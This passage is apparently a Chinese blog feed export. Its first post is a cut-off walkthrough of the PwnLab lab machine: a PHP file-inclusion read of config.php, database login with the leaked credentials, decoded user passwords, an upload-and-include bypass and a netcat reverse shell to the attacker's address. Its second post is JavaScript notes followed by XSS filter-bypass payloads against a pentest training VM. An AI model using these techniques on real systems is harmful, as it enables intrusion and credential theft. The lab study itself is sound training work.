class="string">"?page=upload"</span>&gt;</span>Upload<span class="tag">&lt;/<span class="name">a</span>&gt;</span> ]</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))</span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">include</span>($_GET[<span class="string">'page'</span>].<span class="string">".php"</span>);</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">else</span></span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">"Use this server to upload and share image files inside the intranet"</span>;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>刚好是主页的源代码，证明文件包含漏洞存在。</p>
<p>尝试包含配置文件config.php</p>
<p><a href="http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=config" target="_blank" rel="noopener">http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=config</a></p>
<p>  PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+</p>
<p>base64解码后:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$server	  = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"H4u%QJ_H99"</span>;</span></span><br><span class="line"><span class="php">$database = <span class="string">"Users"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>可以看到账号密码，数据库，尝试在登录页面登录发现不对。（这只是数据库的账号密码）</p>
<p>因为开放了3306端口，所以看下能不能连上3306登录.</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">windows7phone% mysql -h 192.168.43.18 -u root -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome <span class="keyword">to</span> the MySQL monitor.  Commands end with ; <span class="keyword">or</span> \g.</span><br><span class="line">Your MySQL<span class="built_in"> connection </span>id is 6435</span><br><span class="line">Server version: 5.5.47-0+deb8u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2016, Oracle <span class="keyword">and</span>/<span class="keyword">or</span> its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation <span class="keyword">and</span>/<span class="keyword">or</span> its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">'help;'</span> <span class="keyword">or</span> <span class="string">'\h'</span> <span class="keyword">for</span> help.<span class="built_in"> Type </span><span class="string">'\c'</span> <span class="keyword">to</span> clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>

<p>可以发现成功登陆。</p>
<p>接下来的步骤很简单，查表名，账户密码</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">ERROR 1046 (3D000): No database selected</span><br><span class="line">mysql&gt; use Users</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line"><span class="code">+-----------------+</span></span><br><span class="line">| Tables<span class="emphasis">_in_</span>Users |</span><br><span class="line"><span class="code">+-----------------+</span></span><br><span class="line">| users           |</span><br><span class="line"><span class="code">+-----------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line"><span class="code">+------+</span>------------------+</span><br><span class="line">| user | pass             |</span><br><span class="line"><span class="code">+------+</span>------------------+</span><br><span class="line">| kent | Sld6WHVCSkpOeQ== |</span><br><span class="line">| mike | U0lmZHNURW42SQ== |</span><br><span class="line">| kane | aVN2NVltMkdSbw== |</span><br><span class="line"><span class="code">+------+</span>------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>账号kent，密码：Sld6WHVCSkpOeQ==,很容易看出密码经过base64加密，解密下为JWzXuBJJNy</p>
<p>登录进去，成功登陆</p>
<p><img src="/assets/image-20180605200825721.png" alt="image-20180605200825721"></p>
<p>现在是上传文件。上传前因为可以利用文件包含，所以先读下源码：</p>
<p><a href="http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=upload" target="_blank" rel="noopener">http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=upload</a></p>
<p>然后解码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'user'</span>])) &#123; <span class="keyword">die</span>(<span class="string">'You must be log in.'</span>); &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">''</span> <span class="attr">method</span>=<span class="string">'post'</span> <span class="attr">enctype</span>=<span class="string">'multipart/form-data'</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'file'</span> <span class="attr">name</span>=<span class="string">'file'</span> <span class="attr">id</span>=<span class="string">'file'</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'submit'</span> <span class="attr">name</span>=<span class="string">'submit'</span> <span class="attr">value</span>=<span class="string">'Upload'</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span> ($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>] &lt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">		$filename  = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span></span><br><span class="line"><span class="php">		$filetype  = $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];</span></span><br><span class="line"><span class="php">		$uploaddir = <span class="string">'upload/'</span>;</span></span><br><span class="line"><span class="php">		$file_ext  = strrchr($filename, <span class="string">'.'</span>);</span></span><br><span class="line"><span class="php">		$imageinfo = getimagesize($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span></span><br><span class="line"><span class="php">		$whitelist = <span class="keyword">array</span>(<span class="string">".jpg"</span>,<span class="string">".jpeg"</span>,<span class="string">".gif"</span>,<span class="string">".png"</span>); </span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">if</span> (!(in_array($file_ext, $whitelist))) &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Not allowed extension, please upload images only.'</span>);</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">if</span>(strpos($filetype,<span class="string">'image'</span>) === <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Error 001'</span>);</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">if</span>($imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/gif'</span> &amp;&amp; $imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/jpeg'</span> &amp;&amp; $imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/jpg'</span>&amp;&amp; $imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/png'</span>) &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Error 002'</span>);</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">if</span>(substr_count($filetype, <span class="string">'/'</span>)&gt;<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Error 003'</span>);</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">		$uploadfile = $uploaddir . md5(basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])).$file_ext;</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $uploadfile)) &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">echo</span> <span class="string">"&lt;img src=\""</span>.$uploadfile.<span class="string">"\"&gt;&lt;br /&gt;"</span>;</span></span><br><span class="line"><span class="php">		&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Error 4'</span>);</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>可以发现是基于后缀白名单上传的，白名单为</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="string">".jpg"</span>,<span class="string">".jpeg"</span>,<span class="string">".gif"</span>,<span class="string">".png"</span></span><br></pre></td></tr></table></figure>

<p>不仅如此，还检查类型是否为下面类型其中之一。</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">image</span>/gif，<span class="built_in">image</span>/jpeg，<span class="built_in">image</span>/jpg，<span class="built_in">image</span>/png</span><br></pre></td></tr></table></figure>





<p>照片URL：<a href="http://192.168.43.18/upload/bc353652def6dad733344460a949eb04.png" target="_blank" rel="noopener">http://192.168.43.18/upload/bc353652def6dad733344460a949eb04.png</a></p>
<p>设置cookie:</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">lang</span>=../upload/<span class="number">32</span>d3ca5e23f4ccf1e4c8660c40e75f33.png</span><br></pre></td></tr></table></figure>



<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># nc -nvlp 3338</span></span><br></pre></td></tr></table></figure>



<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://192.168.43.18/?cmd=nc<span class="number">%20</span>-nv<span class="number">%20192</span>.168.43.249<span class="number">%203338</span><span class="number">%20</span>-e<span class="number">%20</span>/bin/bash</span><br></pre></td></tr></table></figure>



<p>提权：</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty; pty.spawn("/bin/bash");'</span><br></pre></td></tr></table></figure>





<p>登录kane,密码：iSv5Ym2GRo，</p>
<p>cd /home/kane</p>
<p>ls -al</p>
<p>file msgmike</p>
<p>w</p>
<p>./msgmike</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//Multilingual. Not implemented yet.</span></span></span><br><span class="line"><span class="php"><span class="comment">//setcookie("lang","en.lang.php");</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lang'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">include</span>(<span class="string">"lang/"</span>.$_COOKIE[<span class="string">'lang'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// Not implemented yet.</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>PwnLab Intranet Image Hosting<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>JS学习</title>
    <url>/web/JS%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2><span id="前言">前言</span></h2><p>因为笔者有一定js基础，所以只对一些js忘了的知识和重要难点进行记录以及做了一些与JS有关的XSS实战。</p>
<a id="more"></a>

<h2><span id="第一章-知识">第一章 知识</span></h2><h3><span id="1-实现">1、实现</span></h3><p>（1）要在html中插入js,必须用script标签。浏览器会将script标签中的内容解释为脚本，不会解释为html语言。</p>
<p>（2）通常把js函数放置到head部分或者body底部，或者把脚本放到外部文件中，用.js命名，在head中用link标签引入脚本或者在标签script中用src引入。</p>
<h3><span id="2-html-dom文档对象模型">2、HTML DOM(文档对象模型)</span></h3><p>介绍：可编程对象模型，js能改变页面中所有的html元素和属性、CSS样式，对页面中所有事件作出响应</p>
<h4><span id="21-查找html元素">2.1、查找html元素</span></h4><p>（1）通过id</p>
<p>​    document.getElementById()</p>
<p>（2）通过标签名</p>
<p>​    document.getElementById().getElementsByTagName()</p>
<p>（3）通过类名</p>
<h4><span id="22-改变html">2.2、改变HTML</span></h4><p>（1）改变HTML输出流</p>
<p>​    document.write()</p>
<p>​    [注]文档已完成加载后执行 document.write，整个 HTML 页面将被覆盖。</p>
<p>   (2)改变html内容</p>
<p>​    document.getElementById().innerHTML</p>
<p>（3）改变HTML属性</p>
<p>​    document.getElementById().attribute</p>
<h4><span id="23-改变html样式">2.3、改变HTML样式</span></h4><p>​    document.getElementById().style.property</p>
<h4><span id="24-dom事件响应">2.4、DOM事件响应</span></h4><p>​    事件：onclick=””</p>
<p>​    document.getElementById().onclick=</p>
<h4><span id="25-改变节点">2.5、改变节点</span></h4><p>（1）增加元素</p>
<p>​    如需向 HTML DOM 添加新元素，必须首先创建该元素（元素节点），然后向一个已存在的元素追加该元素。</p>
<p>​    创建元素：document.createElement()</p>
<p>​    创建文本节点：document.createTextNode()</p>
<p>​    追加元素：document.getElementById().appendChild()</p>
<p>（2）删除元素</p>
<p>​    如需删除 HTML 元素，必须首先获得该元素的父元素。</p>
<p>​    删除元素：document.getElementById().removeChild()</p>
<p>​        或 document.getElementById.parentNode.removeChild()</p>
<h3><span id="3-重要语法">3、重要语法</span></h3><p>（1）js语句最后要用分号</p>
<p>（2）js对大小写敏感</p>
<p>（3）js会忽略多余的空格</p>
<p>（4）注释：//或/* */</p>
<p>（5）用var关键词声明变量，变量拥有动态类型</p>
<h3><span id="4-数组">4、数组</span></h3><p>下标从0开始，三种表示方法：</p>
<p>（1）var arrays = new Array();</p>
<p>​    arrays[index];</p>
<p>（2）var arrays = new Array(“”,””,””);</p>
<p>（3）var arrays =[“”,””,””];</p>
<h3><span id="5-字符串">5、字符串</span></h3><p>5.1、常用方法：</p>
<p>（1）new String()创建</p>
<p>（2）indexOf() 检索字符串</p>
<p>（3）lastIndexOf()从后向前检索字符串</p>
<p>（4）replace()替换与正则表达式匹配的子串</p>
<p>（5）substr()从起始索引号提取字符串中指定数目的字符</p>
<p>（6）split()把字符串分割为字符串数组</p>
<p>5.2、常用属性</p>
<p>（1）length 长度</p>
<p>（2）prototype</p>
<h3><span id="6-正则表达式">6、正则表达式</span></h3><p>RegExp</p>
<h4><span id="61-定义正则表达式">6.1、定义正则表达式</span></h4><p>​    new RegExp(pattern,attributes);</p>
<p>​    var patt = new RegExp(“A”);</p>
<p>attribute:</p>
<table>
<thead>
<tr>
<th>attribute</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>i</td>
<td>执行对大小写不敏感匹配</td>
</tr>
<tr>
<td>g</td>
<td>执行全局匹配（查找所有匹配）</td>
</tr>
<tr>
<td>m</td>
<td>执行多行匹配</td>
</tr>
</tbody></table>
<h4><span id="62-方法">6.2、方法</span></h4><p>​    test(B)检索字符串B中是否存在与A匹配的,返回true或者false</p>
<p>​    exec(C)检索字符串C中是否存在与A匹配的，返回值是与A匹配的值</p>
<p>​    compile()改变检索模式或者添加/删除第二个参数。</p>
<h4><span id="63-方括号">6.3、方括号</span></h4><ul>
<li>用于查找某个范围内的字符</li>
<li>[abc]查找方括号之间的任何字符</li>
<li>[^abc]查找任何不在方括号之间的字符</li>
<li>[0-9]查找任何从0至9的数字</li>
<li>[a-z]查找从a到z的字符</li>
<li>[A-z]查找从A到z的字符 //注意A的ASCII码比a的小</li>
</ul>
<h4><span id="64-量词">6.4、量词</span></h4><ul>
<li>n+ 匹配任何包含至少一个n的字符串</li>
<li>n*匹配任何包含零个或多个n的字符串</li>
<li>n?匹配任何包含零个或一个n的字符串</li>
<li>^n匹配任何开头为n的字符串</li>
<li>n$匹配任何结尾为n的字符串</li>
</ul>
<h3><span id="7-js-windows">7、JS windows</span></h3><p>所有浏览器都支持 <em>window</em> 对象。它表示浏览器窗口。</p>
<p>所有 JavaScript 全局对象、函数以及变量均自动成为 window 对象的成员。</p>
<h4><span id="71-浏览器窗口尺寸">7.1、浏览器窗口尺寸</span></h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> w=<span class="built_in">window</span>.innerWidth</span><br><span class="line">|| <span class="built_in">document</span>.documentElement.clientWidth</span><br><span class="line">|| <span class="built_in">document</span>.body.clientWidth;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> h=<span class="built_in">window</span>.innerHeight</span><br><span class="line">|| <span class="built_in">document</span>.documentElement.clientHeight</span><br><span class="line">|| <span class="built_in">document</span>.body.clientHeight;</span><br></pre></td></tr></table></figure>

<h4><span id="72-screen对象">7.2、screen对象</span></h4><p>包含有关用户屏幕的信息</p>
<p>availWidth可用的屏幕宽度</p>
<p>availHeight可用的屏幕高度</p>
<h4><span id="73-location对象">7.3、location对象</span></h4><p>location对象用于获得当前页面的地址 (URL)</p>
<p>（1）hostname返回web主机的域名</p>
<p>（2）pathname返回当前页面的路径和文件名</p>
<p>（3）port 返回web主机的端口</p>
<p>（4）protocol返回所使用的web协议</p>
<p>（5）assign()加载新文档</p>
<h4><span id="74-navigator对象">7.4、Navigator对象</span></h4><p>该对象包含有关访问者浏览器的信息。</p>
<p>[注]来自 navigator 对象的信息具有误导性，不应该被用于检测浏览器版本，navigator数据可被浏览器使用者更改</p>
<p>（1）appCodeName 浏览器代码名</p>
<p>（2）appName 浏览器的名称</p>
<p>（3）appVersion 浏览器的平台和版本信息</p>
<p>（4）cookieEnabled浏览器是否启用cookie</p>
<p>（5）platform浏览器运行的操作系统平台</p>
<p>（6）userAgent客户机发送给服务器的user-agent头</p>
<p>（7）systemLanguage客户机指定的系统语言</p>
<h4><span id="75-windows对象">7.5、windows对象</span></h4><p>（1）location </p>
<p>（2）name 设置或返回窗口的名称</p>
<p>（3）status设置窗口状态栏的文本</p>
<p>（4）close()关闭浏览器窗口</p>
<p>（5）alert()弹出警告框</p>
<p>（6）confirm()弹出确认框</p>
<p>（7）prompt()弹出输入框</p>
<p>（8）open(“URL”,”窗口名称”,”窗口风格”) 打开一个新窗口</p>
<h3><span id="8-函数">8、函数</span></h3><h4><span id="81-定义声明">8.1、定义声明</span></h4><p>函数声明：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="keyword">function</span><span class="constructor">Name(<span class="params">parameters</span>)</span>&#123;</span><br><span class="line"><span class="comment">//code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数表达式：</p>
<p>JavaScript 函数可以通过一个表达式定义，函数表达式可以存储在变量中。在函数表达式存储在变量后，变量也可作为一个函数使用：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="function"><span class="keyword">function</span><span class="params">(parameters)</span></span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> z = x(parameters);</span><br></pre></td></tr></table></figure>

<p>function构造函数</p>
<p>函数同样可以通过内置的 JavaScript 函数构造器（Function()）定义。</p>
<h4><span id="82-参数">8.2、参数</span></h4><p>参数规则：</p>
<p>函数定义时参数没有指定数据类型</p>
<p>如果函数在调用时缺少参数，参数会默认设置为undefined</p>
<p>js函数参数是值传递，对象是引用传递。</p>
<p>Arguments对象</p>
<p>js函数都有个内置的对象arguments。该对象包含了函数调用的参数数组。</p>
<h4><span id="83-调用">8.3、调用</span></h4><p>this关键字指向函数执行时的当前对象。</p>
<p>当函数没有被自身的对象调用时， <strong>this</strong> 的值就会变成全局对象，全局变量属于windows对象。如果函数是对象中的一个方法时，this的值就会变为对象。</p>
<h4><span id="84-闭包">8.4、闭包</span></h4><p>函数既可以访问该函数内部定义的变量又可访问该函数外部定义的变量。</p>
<p>全局变量的作用域是全局性的，局部变量只能用于定义它函数内部。</p>
<p>内嵌函数plus可以访问父函数的变量而不是访问当前函数的变量（用在父函数和当前函数有同名变量时）</p>
<h2><span id="第二章-实战">第二章 实战</span></h2><h3><span id="1-xss跨站脚本攻击">1、XSS（跨站脚本攻击）</span></h3><h4><span id="11-实验环境">1.1、实验环境</span></h4><p>虚拟机：web for pentester</p>
<p>iso下载地址</p>
<p><a href="https://pentesterlab.com/exercises/web_for_pentester/iso" target="_blank" rel="noopener">https://pentesterlab.com/exercises/web_for_pentester/iso</a></p>
<h4><span id="12-第一关">1.2、第一关</span></h4><p><a href="http://192.168.1.114/xss/example1.php?name=hacker" target="_blank" rel="noopener">http://192.168.1.114/xss/example1.php?name=hacker</a></p>
<p><img src="/assets/image-20180531165807632.png" alt="image-20180531165807632"></p>
<p>可以看出是将name的参数显示在屏幕上。</p>
<p>用js语言alert(‘flag’)直接弹出flag</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example1.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>直接弹出flag</p>
<h4><span id="13-第二关">1.3、第二关</span></h4><p>先继续尝试alert(‘flag’)</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example2.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>发现不弹框，应该script标签被过滤</p>
<p>回顾基础知识，html的标签对大小写不敏感</p>
<p>尝试用</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example2.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>正确弹框</p>
<h4><span id="14-第三关">1.4、第三关</span></h4><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example3.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20180531172849293.png" alt="image-20180531172849293"></p>
<p>没用，看来大小写均被过滤了。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example3.php?name=hackerscript</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20180531172939247.png" alt="image-20180531172939247"></p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example3.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20180531173008402.png" alt="image-20180531173008402"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example3.php?name=hacker&lt;script1&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20180531173119142.png" alt="image-20180531173119142"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example3.php?name=hacker&lt;<span class="number">1</span>script1&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20180531173157502.png" alt="image-20180531173157502"></p>
<p>猜想可能是基于&lt;script前缀为匹配的，</p>
<p>用下面方法：</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example3.php<span class="built_in">?name</span>=&lt;scri<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">pt&gt;alert(<span class="string">"flag"</span>)&lt;/sc</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>ript&gt;</span><br></pre></td></tr></table></figure>

<p>过滤掉了script后生下来的字符组成script，成功绕过。</p>
<h4><span id="15-第四关">1.5、第四关</span></h4><p>继续输入</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example4.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>没弹框，再次过滤了。</p>
<p>而且显示：</p>
<p><img src="/assets/image-20180531223835636.png" alt="image-20180531223835636"></p>
<p>试一下其他的：</p>
<p><a href="http://192.168.1.114/xss/example4.php?name=script" target="_blank" rel="noopener">http://192.168.1.114/xss/example4.php?name=script</a></p>
<p>又报error，其他字符则正常显示，看来是出现script字符就会爆报error</p>
<p>换一下其他标签试试</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example4.php?name=&lt;img src=<span class="string">"112321312"</span> onerror=<span class="string">'alert('</span>flag<span class="string">')'</span><span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure>

<p>不能弹出，为什么呢？想一下是单引号中里面还有单引号，语法错误。</p>
<p>换为：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example4.php?name=&lt;img src=<span class="string">"112321312"</span> onerror=<span class="string">"alert('flag')"</span><span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure>

<p>成功弹出，看来只是对script报错</p>
<h4><span id="16-第五关">1.6、第五关</span></h4><p>试下普通的</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20180531225745419.png" alt="image-20180531225745419"></p>
<p>又报错。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example5.php?name=&lt;img src=<span class="string">"112321312"</span> onerror=<span class="string">"alert('flag')"</span><span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure>

<p>也报错。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example5.php?name=&lt;img src=<span class="string">"112321312"</span> <span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure>

